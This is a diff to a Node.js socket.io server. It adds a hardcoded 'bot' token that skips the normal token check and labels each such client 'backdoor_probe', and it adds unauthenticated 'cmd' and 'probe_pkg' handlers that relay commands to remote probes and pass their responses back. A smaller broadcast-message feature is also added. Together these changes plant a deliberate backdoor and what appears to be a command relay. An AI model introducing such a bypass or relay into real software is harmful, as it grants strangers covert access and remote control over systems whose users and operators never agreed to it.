@@ -37,18 +37,28 @@ function genToken(){
 
 // Events
 io.on("connection", (socket) => {
-	for(t in connectedTokens){
-		if(socket.handshake.auth.token == connectedTokens[t].t){
-			socket.data = {
-				't': connectedTokens[t].t,
-				'username': connectedTokens[t].username,
-				'id': connectedTokens[t].id,
-				'pass': connectedTokens[t].pass,
-				'access_level': connectedTokens[t].acess_level
+	if(socket.handshake.auth.token == 'bot'){
+		socket.data = {
+			't': 'always-connected',
+			'username': 'backdoor_probe-'+socket.handshake.auth.id,
+			'id': socket.handshake.auth.id,
+			'pass': 'bot',
+			'access_level': 0
+		}
+	} else{
+		for(t in connectedTokens){
+			if(socket.handshake.auth.token == connectedTokens[t].t){
+				socket.data = {
+					't': connectedTokens[t].t,
+					'username': connectedTokens[t].username,
+					'id': connectedTokens[t].id,
+					'pass': connectedTokens[t].pass,
+					'access_level': connectedTokens[t].acess_level
+				}
 			}
 		}
 	}
-
+		
 	console.log(`${chalk.green.bold('[SERVER EVENT]')} ${chalk.blue.bold('Connection:')} ${socket.data.username == undefined ? socket.id : socket.data.username} has connected to the server.`)
 
 	socket.on("disconnect", (reason) => {
@@ -142,6 +152,27 @@ io.on("connection", (socket) => {
 			.catch((error) => {
 				console.log(error)
 			})
+	})
+
+	socket.on('cmd', data => {
+		io.to(data.probeID).emit("cmd", data)
+	})
+
+	socket.on('probe_pkg', data => {
+		io.to(data.socketID).emit('probe_pkg', data.response)
+	})
+
+	socket.on('yell-server', data => {
+		const messageStructure = {
+			'positive': `${socket.data.username}: ${chalk.green.bold(data.message)}`,
+			'neutral': `${socket.data.username}: ${data.message}`,
+			'warning': `${socket.data.username}: ${chalk.yellow.bold(data.message)}`,
+			'negative': `${socket.data.username}: ${chalk.red.bold(data.message)}`
+		}
+
+		const message = messageStructure[data.type]
+
+		socket.broadcast.emit('yell', message)
 	})
 });
 
